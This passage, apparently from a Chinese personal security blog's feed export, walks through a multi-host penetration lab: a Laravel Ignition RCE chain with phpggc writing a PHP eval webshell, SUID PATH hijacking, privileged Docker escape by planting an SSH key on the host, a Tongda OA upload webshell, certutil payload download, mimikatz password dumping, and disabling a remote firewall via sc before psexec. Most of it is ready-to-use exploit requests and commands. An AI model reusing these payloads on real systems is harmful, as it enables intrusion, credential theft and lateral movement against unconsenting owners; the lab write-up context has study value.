class="language-swift">  &#125;</span><br><span class="language-swift">&#125;</span><br></code></pre></td></tr></table></figure><p>file_put_contents 报错 xxxxxx </p><p>（1）发送如下数据包，将Laravel的原日志文件laravel.log清空：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.8:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>328<br><br><span class="language-swift">&#123;</span><br><span class="language-swift">  <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade<span class="hljs-subst">\\</span>Ignition<span class="hljs-subst">\\</span>Solutions<span class="hljs-subst">\\</span>MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;parameters&quot;</span>: &#123;</span><br><span class="language-swift">    <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,</span><br><span class="language-swift">    <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span><br><span class="language-swift">  &#125;</span><br><span class="language-swift">&#125;</span><br></code></pre></td></tr></table></figure><p>（2）发送如下数据包，给Log增加一次前缀，用于对齐：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.8:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>163<br><br><span class="language-swift">&#123;</span><br><span class="language-swift">  <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade<span class="hljs-subst">\\</span>Ignition<span class="hljs-subst">\\</span>Solutions<span class="hljs-subst">\\</span>MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;parameters&quot;</span>: &#123;</span><br><span class="language-swift">    <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,</span><br><span class="language-swift">    <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;AA&quot;</span></span><br><span class="language-swift">  &#125;</span><br><span class="language-swift">&#125;</span><br></code></pre></td></tr></table></figure><p>(3) 在phpggc目录下执行生成exp </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -d <span class="hljs-string">&quot;phar.readonly=0&quot;</span> ./phpggc Laravel/RCE5 <span class="hljs-string">&quot;system(&#x27;echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php&#x27;);&quot;</span> --phar phar -o php://output | <span class="hljs-built_in">base64</span> -w 0 | python -c <span class="hljs-string">&quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span><br><span class="hljs-comment">#写一个shell</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231115202747638.png" alt="image-20231115202747638"></p><p>（4）将之前生成的编码后的POC作为viewFile的值，发送数据包：注意在生成的poc段后添加a</p><p>   否则最终laravel.log里面将生成两个POC，导致利用失败</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.8:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>5058<br><br><span class="language-dns">&#123;</span><br><span class="language-dns">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="language-dns">  &quot;parameters&quot;: &#123;</span><br><span class="language-dns">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="language-dns">    &quot;viewFile&quot;: &quot;=<span class="hljs-number">50=00=44=00</span>=<span class="hljs-number">39=00=77=00</span>=<span class="hljs-number">61=00=48=00</span>=<span class="hljs-number">41=00=67=00</span>=<span class="hljs-number">58=00=31=00</span>=<span class="hljs-number">39=00=49=00</span>=<span class="hljs-number">51=00=55=00</span>=<span class="hljs-number">78=00=55=00</span>=<span class="hljs-number">58=00=30=00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00=50=00=54</span>=<span class="hljs-number">00=56=00=42</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=54=00=45</span>=<span class="hljs-number">00</span>=......<span class="hljs-number">2</span>B=<span class="hljs-number">00=57=00=61</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00=67=00=49</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=42</span>=<span class="hljs-number">00=48=00=51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00=31=00=43</span>=<span class="hljs-number">00</span>a&quot;</span><br><span class="language-dns">  &#125;</span><br><span class="language-dns">&#125;</span><br></code></pre></td></tr></table></figure><p>（5）发送如下数据包，清空对log文件中的干扰字符，只留下POC：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.8:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>299<br><br><span class="language-swift">&#123;</span><br><span class="language-swift">  <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade<span class="hljs-subst">\\</span>Ignition<span class="hljs-subst">\\</span>Solutions<span class="hljs-subst">\\</span>MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;parameters&quot;</span>: &#123;</span><br><span class="language-swift">    <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,</span><br><span class="language-swift">    <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span><br><span class="language-swift">  &#125;</span><br><span class="language-swift">&#125;</span><br></code></pre></td></tr></table></figure><p>（6）使用<code>phar://</code>进行反序列化，执行任意代码（此时需要使用绝对路径）：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.8:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>210<br><br><span class="language-swift">&#123;</span><br><span class="language-swift">  <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade<span class="hljs-subst">\\</span>Ignition<span class="hljs-subst">\\</span>Solutions<span class="hljs-subst">\\</span>MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;parameters&quot;</span>: &#123;</span><br><span class="language-swift">    <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,</span><br><span class="language-swift">    <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;phar:///var/www/storage/logs/laravel.log/test.txt&quot;</span></span><br><span class="language-swift">  &#125;</span><br><span class="language-swift">&#125;</span><br></code></pre></td></tr></table></figure><p>（7）蚁剑生成shell 连接就行</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231115203431120.png" alt="image-20231115203431120"></p><p>查看cgroup可以判断是否在docker里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/self/cgroup<br></code></pre></td></tr></table></figure><p><a href="https://zhuanlan.zhihu.com/p/388101355">linux cgroups 详解 - 知乎 (zhihu.com)</a></p><p>轻量级容器 Docker 及k8s中的pod就使用了 cgroups 提供的资源限制能力来完成cpu，内存等部分的资源控制。</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231120182807632.png" alt="image-20231120182807632"></p><p>所以这个服务开放在docker里面</p><p>docker内权限提升</p><p>环境变量提权<a href="https://blog.csdn.net/Fly_hps/article/details/80428173">Linux提权利用SUID提权</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span> <br></code></pre></td></tr></table></figure><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231120183108390.png" alt="image-20231120183108390"></p><p>查找具有suid权限的文件 看文件执行结果   一般劫持的有find cp more bash nmap等</p><p>经验</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp <br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; ps<br><br><span class="hljs-built_in">chmod</span> 777 ps <br><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span> <br><br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span> <br><br>/home/jobs <br><br>./shell <span class="hljs-comment">#该./shell文件执行结果是ps 所以劫持ps</span><br></code></pre></td></tr></table></figure><p>执行suid文件劫持环境变量进行提权</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231120183350261.png" alt="image-20231120183350261"></p><p>docker特权逃逸 拿第二台主机</p><p>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载</p><p><a href="https://zhuanlan.zhihu.com/p/614513965">Docker 逃逸方法汇总 - 知乎 (zhihu.com)</a></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">cat /proc/self/status |grep Cap<br></code></pre></td></tr></table></figure><p>检查是否以特权模式启动 看Capeff 是否为000000003ffffffffff 或者000001ffffffffff</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231120183837702.png" alt="image-20231120183837702"></p><p>看逃逸方法 这里选择挂载磁盘 写入ssh公钥 ssh连接</p><p>查看磁盘文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">fdisk -l <span class="hljs-comment">#查看磁盘文件</span><br><span class="hljs-built_in">ls</span> /dev <span class="hljs-comment">#查看设备文件</span><br></code></pre></td></tr></table></figure><p>首先挂载本地磁盘到该docker目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> <span class="hljs-built_in">test</span> <br><br>mount /dev/sda1 /test <br></code></pre></td></tr></table></figure><p>在第一台主机上生成ssh文件 一个私钥一个公钥 私钥赋予权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -f <span class="hljs-built_in">test</span><br><span class="hljs-built_in">chmod</span> 600 <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>将公钥写入我们挂载到docker的磁盘文件中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp -avx <span class="hljs-regexp">/test/</span>home<span class="hljs-regexp">/ubuntu/</span>.ssh<span class="hljs-regexp">/id_rsa.pub /</span>test<span class="hljs-regexp">/home/u</span>buntu<span class="hljs-regexp">/.ssh/</span>authorized_keys<span class="hljs-comment">#看挂载到哪个文件夹下就是哪个文件下</span><br>echo &gt; <span class="hljs-regexp">/test/</span>home<span class="hljs-regexp">/ubuntu/</span>.ssh/authorized_keys<br>echo <span class="hljs-string">&#x27;生成的.pub文件的内容&#x27;</span> &gt; <span class="hljs-regexp">/test/</span>home<span class="hljs-regexp">/ubuntu/</span>.ssh/authorized_keys<br>cat <span class="hljs-regexp">/test/</span>home<span class="hljs-regexp">/ubuntu/</span>.ssh/authorized_keys<br></code></pre></td></tr></table></figure><p>直接ssh连 私钥连接 ssh -i test <a href="mailto:&#117;&#98;&#x75;&#110;&#x74;&#x75;&#64;&#x31;&#57;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#53;&#x32;&#x2e;&#x32;&#48;">&#117;&#98;&#x75;&#110;&#x74;&#x75;&#64;&#x31;&#57;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#53;&#x32;&#x2e;&#x32;&#48;</a></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231120190438171.png" alt="image-20231120190438171"></p><p>至此拿下第二台主机 上线msf</p><p>上线msf后记得更新路由！！</p><p>内网探测</p><p>第二台主机网卡 </p><p>上传fscan iox</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231120190634057.png" alt="image-20231120190634057"></p><p>拿建一个socks5通道</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">VPS</span>   ./iox proxy -l <span class="hljs-number">8888</span> -l <span class="hljs-number">1080</span> <br><br><span class="hljs-attribute">ubuntu</span>   ./iox proxy -r <span class="hljs-number">172.17.137.93:8888</span><br></code></pre></td></tr></table></figure><p>fscan扫描内网</p><p>xxxxxxxxxx find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -user root -perm -4000 -exec ls -ldb {} ;text</p><h2 id="第三台机子（通达OA）"><a href="#第三台机子（通达OA）" class="headerlink" title="第三台机子（通达OA）"></a>第三台机子（通达OA）</h2><p>扫描内网后发现有一台</p><p>192.168.52.30 –192.168.93.10 开放8080端口 挂好socks5代理后查看发现是一个通达oa</p><p>查看版本</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http[s]://TongDaOA.domain/inc/expired.php 判断通达版本<br></code></pre></td></tr></table></figure><p><a href="https://zhuanlan.zhihu.com/p/346513138">通达OA部分漏洞信息整合 - 知乎 (zhihu.com)</a>可以看看这个</p><p>发现有通达OA前台任意用户登录漏洞+RCE漏洞<a href="https://blog.csdn.net/szgyunyun/article/details/107104288">通达OA前台任意用户登录漏洞+RCE漏洞复现_通达oa2016漏洞-CSDN博客</a></p><p>这边是利用了任意文件执行写入msf的payload 正向连接</p><p>首先上传cmd执行文件</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ispirit/im/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>49.233.3.2:8888<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>658<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=123<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;UPLOAD_MODE&quot;</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-number">2</span></span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;P&quot;</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-number">123</span></span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;DEST_UID&quot;</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-number">1</span></span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;ATTACHMENT&quot;</span>; filename=<span class="hljs-string">&quot;jpg&quot;</span></span><br><span class="language-php">Content-Type: image/jpeg</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-variable">$command</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];</span><br><span class="language-php"><span class="hljs-variable">$wsh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">COM</span>(<span class="hljs-string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="language-php"><span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wsh</span>-&gt;<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;cmd /c &quot;</span>.<span class="hljs-variable">$command</span>);</span><br><span class="language-php"><span class="hljs-variable">$stdout</span> = <span class="hljs-variable">$exec</span>-&gt;<span class="hljs-title function_ invoke__">StdOut</span>();</span><br><span class="language-php"><span class="hljs-variable">$stroutput</span> = <span class="hljs-variable">$stdout</span>-&gt;<span class="hljs-title function_ invoke__">ReadAll</span>();</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-variable">$stroutput</span>;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB--</span><br></code></pre></td></tr></table></figure><p>此时会返回一个jpg路径</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231122195231974.png" alt="image-20231122195231974"></p><p>用该jpg文件路径  然后做文件包含</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ispirit/interface/gateway.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>49.233.3.2:8888<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>python-requests/2.21.0<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>69<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-dockerfile">json=&#123;<span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">&quot;/general/../../attach/im/2007/422124454.jpg&quot;</span>&#125;&amp;<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">whoami</span></span></span><br></code></pre></td></tr></table></figure><p>返回 nt authority\system时包含成功</p><p>此时我们上传我们的payload文件</p><p>这里用到的certutil文件上传</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">certutil.exe -urlcache -split -f http://example.com/a.txt<br></code></pre></td></tr></table></figure><p><a href="https://zhuanlan.zhihu.com/p/107819644">certutil 命令详解</a></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231122195519973.png" alt="image-20231122195519973"></p><p>下载到c盘后执行上线</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231122195608601.png" alt="image-20231122195608601"></p><h2 id="第四台机子（DC）"><a href="#第四台机子（DC）" class="headerlink" title="第四台机子（DC）"></a>第四台机子（DC）</h2><p>用msf自带的psexec进行横向移动<a href="https://www.freebuf.com/articles/network/251364.html">内网渗透测试：内网横向移动基础总结 - FreeBuf网络安全行业门户</a> 在192.168.52.30那台机子上进行</p><p>第一步获取域内单机密码</p><p>用msf中的mimikatz</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts">load kiwi<br><br>ps<br><br>migrate xxx(进程号)<span class="hljs-meta">#进程迁移至x64进程中</span><br><br>kiwi_cmd sekurlsa::logonpasswords<span class="hljs-meta">#读取域管理员账号和密码</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231122204111548.png" alt="image-20231122204111548"></p><p>psexec需要目标机子关闭防火墙</p><p>这里使用$IPC进行连接 sc进行命令执行<a href="https://blog.csdn.net/qq_53079406/article/details/128899133?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-128899133-blog-86555918.235%5Ev38%5Epc_relevant_anti_vip_base&spm=1001.2101.3001.4242.2&utm_relevant_index=4">【内网安全-横向移动】IPC$连接—＞计划任务—＞上线_ipc链接命令_黑色地带(崛起)的博客-CSDN博客</a></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.93.30</span>\ipc$ <span class="hljs-string">&quot;Whoami2021&quot;</span> /user:<span class="hljs-string">&quot;Administrator&quot;</span><br><br>sc \\<span class="hljs-number">192.168.93.30</span> create unablefirewall binpath=<span class="hljs-string">&quot;netsh advfirewall set allprofiles state off&quot;</span><br><br>sc \\<span class="hljs-number">192.168.93.30</span> start unablefirewall<br></code></pre></td></tr></table></figure><p>防火墙关闭以后就用psexec横向移动</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231122204236179.png" alt="image-20231122204236179"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231122204333341.png" alt="image-20231122204333341"></p><p>上线msf</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231122195701985.png" alt="image-20231122195701985"></p><h2 id="第五台机子（永恒之蓝）"><a href="#第五台机子（永恒之蓝）" class="headerlink" title="第五台机子（永恒之蓝）"></a>第五台机子（永恒之蓝）</h2><p>没复现成功不知道为啥 然后后面route断了直接摆烂</p><p>原理就永恒之蓝的ms17_010漏洞复现</p>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bugku3</title>
    <link href="/2023/12/17/penetration/bugku3/"/>
    <url>/2023/12/17/penetration/bugku3/</url>
    
    <content type="html"><![CDATA[<p>.&#x2F;xray_linux_amd64 webscan –basic-crawler <a href="http://106.14.96.176/">http://106.14.96.176/</a> </p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231208141400240.png" alt="image-20231208141400240"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231208141423784.png" alt="image-20231208141423784"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231208141500725.png" alt="image-20231208141500725"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231208141622028.png" alt="image-20231208141622028"></p><p>提示内网</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231208150352687.png" alt="image-20231208150352687"></p><p>intruder开爆</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231208150146683.png" alt="image-20231208150146683"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231208153804375.png" alt="image-20231208153804375"></p>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux命令</title>
    <link href="/2023/12/17/penetration/linux%E5%91%BD%E4%BB%A4%E6%B7%BB%E5%8A%A0/"/>
    <url>/2023/12/17/penetration/linux%E5%91%BD%E4%BB%A4%E6%B7%BB%E5%8A%A0/</url>
    
